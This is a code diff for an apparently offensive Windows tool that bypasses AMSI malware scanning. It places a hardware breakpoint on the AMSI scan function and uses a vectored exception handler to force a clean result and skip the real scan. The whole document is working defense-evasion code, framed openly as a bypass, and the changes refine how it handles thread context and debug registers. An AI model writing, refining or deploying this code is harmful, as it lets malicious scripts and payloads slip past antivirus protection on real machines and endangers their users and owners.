@@ -16,10 +16,14 @@ static LONG NTAPI amsi_hwbp_handler(PEXCEPTION_POINTERS exc) {
     int* result_ptr = reinterpret_cast<int*>(stack[6]);
     if (result_ptr) *result_ptr = 0;
 
-    exc->ContextRecord->Rax = 0x80070057;
+    exc->ContextRecord->Rax = S_OK;
+
+    exc->ContextRecord->Dr0 = 0;
+    exc->ContextRecord->Dr7 &= ~1ULL;
+    exc->ContextRecord->EFlags = 0;
+
     exc->ContextRecord->Rip = stack[0];
     exc->ContextRecord->Rsp += 8;
-    exc->ContextRecord->Dr6 = 0;
 
     return EXCEPTION_CONTINUE_EXECUTION;
 }
@@ -33,8 +37,8 @@ bool patch_amsi_bypass() {
     if (!s_veh_handle) return false;
 
     CONTEXT ctx = {};
-    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
-    HANDLE hThread = g_apis.pGetCurrentThread();
+    ctx.ContextFlags = CONTEXT_ALL;
+    HANDLE hThread = reinterpret_cast<HANDLE>(static_cast<LONG_PTR>(-2));
 
     if (!g_apis.pGetThreadContext(hThread, &ctx)) {
         g_apis.pRemoveVectoredExceptionHandler(s_veh_handle);
@@ -43,9 +47,8 @@ bool patch_amsi_bypass() {
     }
 
     ctx.Dr0 = reinterpret_cast<DWORD64>(s_amsi_addr);
-    ctx.Dr6 = 0;
-    ctx.Dr7 = (ctx.Dr7 & ~(3ULL << 16 | 3ULL << 18 | 3ULL)) | 1ULL;
-    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+    ctx.Dr7 |= 1ULL;
+    ctx.ContextFlags = CONTEXT_ALL;
 
     if (!g_apis.pSetThreadContext(hThread, &ctx)) {
         g_apis.pRemoveVectoredExceptionHandler(s_veh_handle);
@@ -60,14 +63,13 @@ void restore_amsi_bypass() {
     if (!s_veh_handle) return;
 
     CONTEXT ctx = {};
-    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
-    HANDLE hThread = g_apis.pGetCurrentThread();
+    ctx.ContextFlags = CONTEXT_ALL;
+    HANDLE hThread = reinterpret_cast<HANDLE>(static_cast<LONG_PTR>(-2));
 
     if (g_apis.pGetThreadContext(hThread, &ctx)) {
         ctx.Dr0 = 0;
-        ctx.Dr6 = 0;
         ctx.Dr7 &= ~1ULL;
-        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+        ctx.ContextFlags = CONTEXT_ALL;
         g_apis.pSetThreadContext(hThread, &ctx);
     }
 
